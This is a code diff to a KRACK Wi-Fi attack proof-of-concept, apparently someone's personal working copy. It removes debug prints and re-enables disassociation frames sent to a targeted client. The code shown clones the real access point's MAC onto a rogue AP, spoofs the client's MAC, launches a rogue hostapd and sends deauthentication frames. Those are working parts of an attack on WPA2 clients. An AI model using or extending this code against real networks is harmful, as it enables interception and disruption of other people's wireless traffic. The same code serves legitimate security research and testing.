@@ -845,7 +845,6 @@ class KRAckAttack():
 		if self.clientmac:
 				self.nic_real_clientack = self.nic_real + "sta1"
 				subprocess.check_output(["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
-				print(datetime.now()) # -- debug
 				call_macchanger(self.nic_real_clientack, self.clientmac)
 		else:
 			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
@@ -885,7 +884,6 @@ class KRAckAttack():
 		set_mac_address(self.nic_rogue_ap, self.apmac)
 
 		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
-		print(datetime.now()) # -- debug
 		if self.nic_real_clientack: subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
 
 		# FIXME: Set BFP filters to increase performance, can't set suceessful.
@@ -901,7 +899,7 @@ class KRAckAttack():
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 
 		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-		self.hostapd_log = open("hostapd_rogue.log", "w")
+		# self.hostapd_log = open("hostapd_rogue.log", "w")
 
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(10)
@@ -921,11 +919,8 @@ class KRAckAttack():
 		self.sock_real.send(deauth)
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
-		# if self.clientmac: -- debug
-		# 	self.queue_disas(self.clientmac)
-
-		# 將流氓 AP 與原 AP 連線
-		# subprocess.check_output(["wpa_supplicant", "-i", "wlan0sta1", "-c", "/home/sun10/krackattacks-poc-zerokey/wpa_supplicant/rea_ap.conf", "-B"])
+		if self.clientmac:
+			self.queue_disas(self.clientmac)
 
 		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
